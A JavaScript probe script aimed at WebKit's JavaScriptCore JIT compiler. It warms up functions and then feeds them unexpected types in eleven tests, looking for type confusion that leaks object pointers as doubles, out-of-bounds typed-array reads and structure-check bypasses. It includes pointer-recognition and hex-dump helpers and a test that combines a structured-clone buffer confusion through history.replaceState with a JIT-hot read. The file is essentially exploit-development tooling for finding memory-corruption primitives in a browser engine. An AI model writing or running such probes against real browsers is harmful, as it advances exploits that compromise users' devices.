// JIT type confusion probe for JSC (WebKit 613.0)
// Tests whether DFG/FTL JIT makes exploitable type assumptions
(function() {
'use strict';

var results = { tests: [] };
var WARMUP = 100000;

function test(name, fn) {
  try {
    var r = fn();
    r.name = name;
    results.tests.push(r);
  } catch(e) {
    results.tests.push({ name: name, error: e.message });
  }
}

// Helper: check if a value is a double that looks like a tagged pointer
function looksLikePtr(v) {
  if (typeof v !== 'number') return false;
  if (v !== v) return false; // NaN
  if (!isFinite(v)) return false;
  // JSC NaN-boxing: pointers have certain bit patterns
  // On 64-bit, a pointer is usually 0x0001XXXXXXXXXXXX range
  var buf = new ArrayBuffer(8);
  var f64 = new Float64Array(buf);
  var u32 = new Uint32Array(buf);
  f64[0] = v;
  var hi = u32[1];
  // JSC tagged pointers typically have high 16 bits as 0x0000 or 0xFFFE/0xFFFF
  return (hi >>> 16) === 0x0000 || (hi >>> 16) >= 0xFFF8;
}

function f64ToHex(v) {
  var buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = v;
  var u = new Uint32Array(buf);
  return '0x' + u[1].toString(16).padStart(8,'0') + u[0].toString(16).padStart(8,'0');
}

// Test 1: Array.prototype.at() type confusion
// JIT optimizes for double arrays, then call with object array
test('array_at_confusion', function() {
  function getAt(arr, idx) { return arr[idx]; }

  // Warmup with double arrays
  var dblArr = [1.1, 2.2, 3.3, 4.4];
  for (var i = 0; i < WARMUP; i++) getAt(dblArr, i & 3);

  // Now call with object array
  var obj = { marker: 0xDEADBEEF };
  var objArr = [obj, obj, obj, obj];
  var val = getAt(objArr, 0);

  return {
    result: typeof val === 'number' ? 'TYPE_CONFUSED' : 'normal',
    type: typeof val,
    isPtr: typeof val === 'number' ? looksLikePtr(val) : false,
    hex: typeof val === 'number' ? f64ToHex(val) : null
  };
});

// Test 2: Optimized function with CheckStructure speculation failure
test('structure_check_bypass', function() {
  function readProp(o) { return o.x; }

  var a = { x: 1.1 };
  for (var i = 0; i < WARMUP; i++) readProp(a);

  // Different structure
  var b = { y: 1, x: {} };
  var val = readProp(b);

  return {
    result: typeof val === 'number' ? 'LEAKED' : 'normal',
    type: typeof val,
    hex: typeof val === 'number' ? f64ToHex(val) : null
  };
});

// Test 3: Array species / constructor confusion
test('array_species', function() {
  function sumArr(arr) {
    var s = 0;
    for (var i = 0; i < arr.length; i++) s += arr[i];
    return s;
  }

  var dbl = new Float64Array([1.0, 2.0, 3.0]);
  for (var i = 0; i < WARMUP; i++) sumArr(dbl);

  var mixed = [1.0, {}, 3.0];
  var val = sumArr(mixed);

  return {
    result: typeof val === 'number' && !isFinite(val) ? 'NaN_leak' : 'normal',
    val: val,
    isNaN: val !== val,
    hex: typeof val === 'number' ? f64ToHex(val) : null
  };
});

// Test 4: arguments object confusion
test('arguments_confusion', function() {
  function leaky() {
    var a = arguments;
    return a[0] + a[1];
  }

  for (var i = 0; i < WARMUP; i++) leaky(1.1, 2.2);

  var obj = { toString: function() { return '0'; } };
  var val = leaky(obj, 1.1);

  return {
    result: typeof val,
    val: String(val).substring(0, 30),
    hex: typeof val === 'number' ? f64ToHex(val) : null
  };
});

// Test 5: Bound function / getter confusion
test('getter_confusion', function() {
  var counter = 0;
  function readIdx(arr) { return arr[0]; }

  var doubles = [1.1, 2.2, 3.3];
  for (var i = 0; i < WARMUP; i++) readIdx(doubles);

  // Create array-like with getter that returns object
  var fake = { length: 3, 0: {ptr: 0x41414141}, 1: 2.2, 2: 3.3 };
  var val = readIdx(fake);

  return {
    result: typeof val === 'number' ? 'CONFUSED_DOUBLE' : 'normal',
    type: typeof val,
    hex: typeof val === 'number' ? f64ToHex(val) : null
  };
});

// Test 6: Prototype chain pollution during JIT
test('proto_pollution_jit', function() {
  function readLen(arr) { return arr.length; }

  var a = [1.1, 2.2, 3.3];
  for (var i = 0; i < WARMUP; i++) readLen(a);

  // Change prototype after JIT compilation
  var b = [1.1, 2.2];
  Object.defineProperty(b, 'length', { get: function() { return 0xDEAD; } });
  var val = readLen(b);

  return {
    result: val === 0xDEAD ? 'getter_called' : 'JIT_CACHED',
    val: val
  };
});

// Test 7: TypedArray bounds check elimination
test('typed_array_bce', function() {
  var buf = new ArrayBuffer(64);
  var view = new Uint32Array(buf);
  for (var i = 0; i < view.length; i++) view[i] = 0x41414141;

  function readAt(arr, idx) { return arr[idx]; }

  for (var i = 0; i < WARMUP; i++) readAt(view, i % view.length);

  // Try OOB read after JIT compiles away bounds check
  var oobVal = readAt(view, 16); // index 16 = byte offset 64 = exactly OOB
  var oobVal2 = readAt(view, 32); // further OOB

  return {
    result: oobVal === undefined ? 'bounded' : 'OOB_READ',
    oobVal: oobVal === undefined ? 'undefined' : '0x' + (oobVal >>> 0).toString(16),
    oobVal2: oobVal2 === undefined ? 'undefined' : '0x' + (oobVal2 >>> 0).toString(16)
  };
});

// Test 8: RegExp lastIndex type confusion
test('regexp_lastindex', function() {
  var re = /test/g;
  function getLastIdx(r) { return r.lastIndex; }

  re.lastIndex = 0;
  for (var i = 0; i < WARMUP; i++) getLastIdx(re);

  // Set lastIndex to object
  re.lastIndex = { valueOf: function() { return 42; } };
  var val = getLastIdx(re);

  return {
    result: typeof val === 'number' ? 'TYPE_CONFUSED' : 'normal',
    type: typeof val,
    val: String(val).substring(0, 20)
  };
});

// Test 9: DFG PutByVal type confusion
test('putbyval_confusion', function() {
  function setIdx(arr, idx, val) { arr[idx] = val; return arr[idx]; }

  var dbl = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
  for (var i = 0; i < WARMUP; i++) setIdx(dbl, i & 7, 9.9);

  // Fresh array, write object where doubles expected
  var fresh = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
  var obj = {};
  setIdx(fresh, 0, obj);

  // Read back — if JIT still thinks it's doubles, we get the pointer as f64
  var readback = fresh[0];
  return {
    result: typeof readback === 'number' ? 'LEAKED' : 'normal',
    type: typeof readback,
    hex: typeof readback === 'number' ? f64ToHex(readback) : null,
    isPtr: typeof readback === 'number' ? looksLikePtr(readback) : false
  };
});

// Test 10: Multi-tier deopt confusion
// Trigger OSR exit with unexpected types after FTL compilation
test('osr_exit_confusion', function() {
  function compute(a, b) {
    var x = a + b;
    var y = x * 2;
    return y;
  }

  // Tier up with ints
  for (var i = 0; i < WARMUP * 2; i++) compute(i, i + 1);

  // Now with double
  var v1 = compute(1.1, 2.2);

  // Now with object — triggers deopt
  var sentinel = { valueOf: function() { return 0xCAFE; } };
  var v2 = compute(sentinel, 1);

  return {
    result: 'deopt_test',
    v1: v1,
    v2: v2,
    v2hex: typeof v2 === 'number' ? f64ToHex(v2) : null
  };
});

// Test 11: StructuredClone + JIT combo — use confused buffer in JIT-hot function
test('sc_jit_combo', function() {
  // Build confused same-size buffers
  var target = new ArrayBuffer(64);
  var tv = new Uint8Array(target);
  tv.fill(0x41);

  var source = new ArrayBuffer(64);
  var sv = new Uint8Array(source);
  sv.fill(0x42);
  var v1 = new Uint8Array(source);
  var v2 = new Uint8Array(source);

  var filler = [1n, target, v1, v2];
  while (filler.length < 100) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(103);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[102] = -1;

  history.replaceState(outer, '');
  var c = history.state;
  history.replaceState(null, '');
  if (!c) return { result: 'null_state' };

  var confused = c[0][3];
  if (!(confused instanceof Uint8Array)) return { result: 'no_confused_view' };

  // JIT-hot function that operates on the confused view
  function readView(v, idx) { return v[idx]; }
  for (var i = 0; i < WARMUP; i++) readView(confused, i % confused.length);

  // Now swap the buffer contents
  var tbuf = new Uint8Array(c[0][1]);
  // Write a "pointer-like" value
  tbuf[0] = 0x00; tbuf[1] = 0x00; tbuf[2] = 0x01; tbuf[3] = 0x00;
  tbuf[4] = 0x00; tbuf[5] = 0x00; tbuf[6] = 0x00; tbuf[7] = 0x00;

  var readback = readView(confused, 0);

  return {
    result: 'combo_test',
    confused_byte0: confused[0],
    direct_byte0: tbuf[0],
    readback: readback,
    same: confused[0] === tbuf[0]
  };
});

return JSON.stringify(results);
})();
